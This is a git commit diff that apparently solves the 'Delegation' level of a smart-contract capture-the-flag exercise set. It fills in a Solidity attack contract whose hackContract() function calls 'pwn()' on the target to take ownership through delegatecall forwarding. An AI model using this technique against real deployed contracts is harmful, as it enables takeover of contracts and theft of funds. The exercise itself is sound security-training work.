8e95e44c59c514caf2cc5a037fba97ac64d7a764
Nick Balestra-Foster <nick@balestrafoster.com>
2022-06-27 21:31:30 -0700

    2 - Delegation

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -4,12 +4,14 @@ import "./Delegation.sol";
 
 contract AttackingDelegation {
     address public contractAddress;
+    Delegate public delegate;
 
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
     }
 
     function hackContract() external {
-        // Code me!
+      (bool _success,) = contractAddress.call(abi.encodeWithSignature("pwn()"));
+      require(_success);
     }
 }
